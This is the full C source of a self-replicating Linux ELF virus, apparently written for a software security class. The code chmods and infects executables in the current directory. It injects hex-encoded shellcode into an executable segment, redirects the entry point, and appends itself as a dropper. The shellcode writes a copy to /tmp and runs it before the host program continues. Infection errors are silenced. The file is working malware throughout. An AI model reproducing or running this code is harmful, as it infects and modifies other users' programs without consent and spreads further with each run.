//
//  main.c
//  SoftSec Virus
//
//  Created by Carter McCardwell on 11/17/17.
//  GPLv2+: GNU GPL version 2 or later.
//  Took some inspiration from: https://github.com/BR903/ELFkickers/
//

#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <fcntl.h>
#include <elf.h>
#include <string.h>

//This definition must be set to the same size as the compiled dropper size in bytes
#define DROPPER_SIZE 16376

unsigned char base_infection[] = {
    //Push original args onto stack
    0x50, 0x57, 0x56, 0x52,
    
    //Replication
    //---------------------------------------------------------------------
    0xeb, 0x3b, 0x48, 0x65, 0x6c, 0x6c, 0x6f, 0x21, 0x20, 0x49, 0x20, 0x61,
    0x6d, 0x20, 0x61, 0x20, 0x73, 0x69, 0x6d, 0x70, 0x6c, 0x65, 0x20, 0x76,
    0x69, 0x72, 0x75, 0x73, 0x21, 0x0a, 0x00, 0x2f, 0x70, 0x72, 0x6f, 0x63,
    0x2f, 0x73, 0x65, 0x6c, 0x66, 0x2f, 0x65, 0x78, 0x65, 0x00, 0x2f, 0x74,
    0x6d, 0x70, 0x2f, 0x63, 0x4a, 0x38, 0x66, 0x30, 0x61, 0x73, 0x6a, 0x66,
    0x00, 0x53, 0xbb, 0x02, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x35, 0xd5, 0xff,
    0xff, 0xff, 0xb9, 0x0f, 0x00, 0x00, 0x00, 0x31, 0xd2, 0x89, 0xd8, 0x48,
    0x8d, 0x7c, 0x24, 0xe2, 0xf3, 0xa4, 0x48, 0x8d, 0x7c, 0x24, 0xe2, 0x31,
    0xf6, 0x0f, 0x05, 0xb9, 0x09, 0x00, 0x00, 0x00, 0x41, 0x89, 0xc0, 0x31,
    0xff, 0xbe,
    
    //st_sz
    0xc0, 0xc0, 0x00, 0x00,
    
    0xba, 0x01, 0x00, 0x00, 0x00, 0x41,
    0xba, 0x02, 0x00, 0x00, 0x00, 0x45, 0x31, 0xc9, 0x89, 0xc8, 0x0f, 0x05,
    0x48, 0x8d, 0x35, 0xa3, 0xff, 0xff, 0xff, 0x49, 0x89, 0xc0, 0x48, 0x8d,
    0x7c, 0x24, 0xf1, 0xb9, 0x0f, 0x00, 0x00, 0x00, 0xba, 0xc0, 0x01, 0x00,
    0x00, 0x89, 0xd8, 0xf3, 0xa4, 0x48, 0x8d, 0x7c, 0x24, 0xf1, 0xbe, 0x42,
    0x00, 0x00, 0x00, 0x0f, 0x05, 0x41, 0xb9, 0x01, 0x00, 0x00, 0x00, 0x89,
    0xc7, 0x49, 0x8d, 0xb0,
    
    //Payload Size
    0xe8, 0x79, 0x00, 0x00,
    
    0xba,
    
    //st_sz - payload size
    0xd8, 0x46, 0x00, 0x00,
    
    0x44, 0x89, 0xc8, 0x0f, 0x05, 0xb8, 0x03, 0x00, 0x00, 0x00, 0x0f,
    0x05, 0xbe,
    
    //st_sz
    0xc0, 0xc0, 0x00, 0x00,
    
    0x4c, 0x89, 0xc7, 0xb8, 0x0b, 0x00,
    0x00, 0x00, 0x0f, 0x05, 0xb8, 0x39, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x85,
    0xc0, 0x75, 0x11, 0x48, 0x8d, 0x7c, 0x24, 0xf1, 0x31, 0xf6, 0x31, 0xd2,
    0xb8, 0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc3, 0x89, 0xc7, 0x31,
    0xf6, 0x31, 0xd2, 0x45, 0x31, 0xd2, 0xb8, 0x3d, 0x00, 0x00, 0x00, 0x0f,
    0x05, 0xb8, 0x57, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x7c, 0x24, 0xf1, 0x0f,
    0x05, 0xbf, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x35, 0xe2, 0xfe, 0xff,
    0xff, 0xba, 0x1c, 0x00, 0x00, 0x00, 0x44, 0x89, 0xc8, 0x0f, 0x05, 0x31,
    0xc0, 0x5b,
    //---------------------------------------------------------------------

    //Pop args
    0x5A, 0x5E, 0x5F, 0x58,
    //JMP
    0xE9,
    //Return addr
    0x00, 0x00, 0x00, 0x00
};

//Holds the size of the executable to infect
off_t file_setup_len = 0;

void fail(const char *msg) {
    //msg != NULL ? fprintf(stderr, "%s\n", msg) : 0;
    exit(0);
}

//Checks the ELF header of an execuable if it is already infected
//We also ignore files named "virus"
bool check_infection(struct dirent *dir, struct stat *file) {
    if (strcmp(dir->d_name, ".") == 0 || strcmp(dir->d_name, "..") == 0 || strcmp(dir->d_name, "virus") == 0) {
        return true;
    }
    
    bool infected = false;
    int exe;
    if ((exe = open(dir->d_name, O_RDWR)) < 0) {
        return true;
        //fail("Unable to open file to infect");
    }
    
    char *map = mmap(NULL, file->st_size, PROT_WRITE | PROT_READ, MAP_SHARED, exe, 0);
    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)map;
    
    //Check header
    if (ehdr->e_ident[EI_OSABI] == 0xCC) {
        infected = true;
    }
    
    munmap(map, file->st_size);
    close(exe);
    
    return infected;
}

//Find an execuatable in the current directory to infect
void* get_executable() {
    DIR *d;
    struct dirent *dir;
    d = opendir(".");
    if (d) {
        while ((dir = readdir(d)) != NULL) {
            if (chmod(dir->d_name, 0755) < 0) {
                continue; //We don't have write permissions.
            }
            struct stat sb;
            if (stat(dir->d_name, &sb) == 0 && sb.st_mode & S_IXUSR && dir->d_type == DT_REG) {
                if (!check_infection(dir, &sb)) {
                    int exe;
                    if ((exe = open(dir->d_name, O_RDWR)) < 0) {
                        continue;
                        //fail("Unable to open file to infect");
                    }
                    char *file = mmap(NULL, sb.st_size+DROPPER_SIZE, PROT_WRITE | PROT_READ, MAP_SHARED, exe, 0);
                    //Check if a 64-bit elf
                    if (file[EI_CLASS] == ELFCLASS64) {
                        //Add space for the dropper
                        if (truncate(dir->d_name, sb.st_size+DROPPER_SIZE) != 0) {
                            continue;
                            //fail("Unable to add padding space to exe");
                        }
                        file_setup_len = sb.st_size;
                        return file;
                    }
                }
            }
        }
        closedir(d);
    }
    
    fail("No valid executable is avaliable to infect...");
    return NULL;
}

//Find an empty slot in the phdr to insert the payload code
int findinfectionphdr(Elf64_Phdr const *phdr, int count)
{
    Elf64_Off pos, endpos;
    int i, j;
    
    for (i = 0 ; i < count ; ++i) {
        if (phdr[i].p_filesz > 0 && phdr[i].p_filesz == phdr[i].p_memsz
            && (phdr[i].p_flags & PF_X)) {
            pos = phdr[i].p_offset + phdr[i].p_filesz;
            endpos = pos + sizeof base_infection;
            for (j = 0; j < count; ++j) {
                if (phdr[j].p_offset >= pos && phdr[j].p_offset < endpos
                    && phdr[j].p_filesz > 0)
                    break;
            }
            if (j == count)
                return i;
        }
    }
    return -1;
}

//Add the dropper executable to an executable
void append_dropper(void *executable_map) {
    int self_hdl = open("/proc/self/exe", O_RDONLY, 0);
    void *self = mmap(NULL, DROPPER_SIZE, PROT_READ, MAP_PRIVATE, self_hdl, 0);
    
    if (memcpy(executable_map + file_setup_len, self, DROPPER_SIZE) != (executable_map + file_setup_len)) {
        fail("Unable to append dropper executable");
    }
    
    munmap(self, DROPPER_SIZE);
}

//Update the executable offsets in the payload
void correct_offsets() {
    *(int *)(base_infection + 114) = DROPPER_SIZE + file_setup_len;
    *(int *)(base_infection + 210) = DROPPER_SIZE + file_setup_len;
    *(int *)(base_infection + 188) = file_setup_len;
    *(int *)(base_infection + 193) = DROPPER_SIZE;
}

//Method to infect an executable in the same directory as the running program
bool infect_target() {
    char *executable_map = get_executable();
    if (executable_map == NULL) { return false; }
    int seg_n;
    
    Elf64_Ehdr *ehdr;
    Elf64_Phdr *phdr;
    
    ehdr = (Elf64_Ehdr *)executable_map;
    phdr = (Elf64_Phdr *)(executable_map + ehdr->e_phoff);
    
    seg_n = findinfectionphdr(phdr, ehdr->e_phnum);
    
    *(Elf64_Word*)(base_infection + sizeof(base_infection) - 4) = (Elf64_Word)ehdr->e_entry - (phdr[seg_n].p_vaddr + phdr[seg_n].p_filesz + sizeof base_infection);
    ehdr->e_entry = phdr[seg_n].p_vaddr + phdr[seg_n].p_filesz;
    
    correct_offsets();
    
    //Copy the payload to the empty space inside the target ELF executable
    if (memcpy(executable_map + phdr[seg_n].p_offset + phdr[seg_n].p_filesz, base_infection, sizeof(base_infection)) != (executable_map + phdr[seg_n].p_offset + phdr[seg_n].p_filesz)) {
        fail("Unable to modify executable");
    }
    phdr[seg_n].p_filesz += sizeof(base_infection);
    phdr[seg_n].p_memsz += sizeof(base_infection);
    
    //Set the identification flag so we know the file is "infected"
    ehdr->e_ident[EI_OSABI] = 0xCC;
    
    //Add the dropper payload
    append_dropper(executable_map);
    
    msync(executable_map, file_setup_len + DROPPER_SIZE, MS_SYNC);
    munmap(executable_map, file_setup_len + DROPPER_SIZE);
    
    return true;
}

int main(int argc, const char * argv[]) {
    if (argc > 0) {
        printf("Hello! I am a simple virus!\n");
    }
    infect_target();
}
